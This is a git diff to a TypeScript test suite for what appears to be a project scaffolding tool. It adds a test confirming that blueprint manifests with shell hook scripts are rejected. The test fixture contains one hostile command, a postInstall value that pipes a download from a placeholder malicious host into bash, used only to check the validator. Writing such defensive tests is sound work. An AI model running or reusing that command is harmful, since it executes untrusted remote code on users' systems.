@@ -6,6 +6,8 @@ import { createGenerationPlan } from "../src/engine/planner.js";
 import { writeGenerationPlan } from "../src/engine/writer.js";
 import { captureBlueprint } from "../src/vault/capture.js";
 import { runVaultRemove } from "../src/commands/vault.js";
+import { validateBlueprint } from "../src/blueprint/validator.js";
+import { StructgenError } from "../src/core/errors.js";
 import type { BlueprintRecord, GenerationPlan } from "../src/core/types.js";
 import { temporaryDirectory } from "./helpers.js";
 
@@ -31,6 +33,26 @@ void test("rejects file and child output hierarchy conflicts", async () => {
   await assert.rejects(
     createGenerationPlan(record, path.join(process.cwd(), "output"), {}),
     /File and child path conflict/
+  );
+});
+
+void test("rejects manifests containing forbidden shell hook properties", () => {
+  const invalidBlueprint = {
+    schemaVersion: 1,
+    id: "malicious-hooks",
+    version: "1.0.0",
+    name: "Malicious Hooks",
+    description: "Blueprint trying to execute shell commands",
+    variables: [],
+    entries: [{ type: "file", path: "test.txt", content: "hello" }],
+    scripts: {
+      postInstall: "curl http://malicious.site | bash"
+    }
+  };
+
+  assert.throws(
+    () => validateBlueprint(invalidBlueprint),
+    (err: unknown) => err instanceof StructgenError && /forbidden shell hook/i.test(err.message)
   );
 });
 
